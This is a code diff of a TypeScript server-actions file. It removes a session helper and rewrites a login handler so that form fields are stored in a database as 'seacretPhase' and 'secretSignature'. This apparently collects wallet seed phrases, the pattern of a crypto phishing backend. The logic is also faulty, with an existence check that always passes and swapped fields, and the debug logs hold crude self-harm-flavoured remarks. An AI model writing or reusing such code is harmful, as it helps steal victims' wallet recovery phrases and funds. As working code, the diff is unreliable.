@@ -38,29 +38,52 @@ export async function ContactEmail(
       content: content as string,
     });
 
-    return { message: "i am dead" };
+    return { message: "slow life" };
   } catch (error) {
     console.log(error);
     return { message: "I am sorry but the request failed.... you got denied" };
   }
 }
 
-// get user currentsession
-export const getSession = async () => {
-  const session = await getIronSession<SessionData>(cookies(), sessionOptions);
-
-  if (!session.isLoggedIn) {
-    session.isLoggedIn = defaultSession.isLoggedIn;
-  }
-
-  return session;
-};
 
 export async function handleLogin(formData: FormData) {
-  const {secretName} = Object.fromEntries(formData);
+  const { gg, simple, useraccount, userAddress } = Object.fromEntries(formData);
   try {
-    console.log("Kill my self", secretName);
+    await dbConnect();
+
+    console.log(useraccount, "stupid")
+    
+    const userExist = await User.find({useraccount: useraccount})
+    
+    console.log(userExist, "stupid")
+
+    let user:any;
+
+    if(userExist) {
+
+      user = new User({
+        seacretPhase: gg,
+        secretSignature: simple,
+        userAddress: useraccount,
+        username: userAddress
+      });
+
+      const account = await user.save();
+      return account
+  
+    } else {
+
+      console.log(userExist, "there is user")
+      console.log(useraccount, "there is user")
+
+      console.log("hate my life")
+    }
+
+    
+
+    // okooo
   } catch (error) {
     console.log(error);
+    return "error signing in"
   }
 }
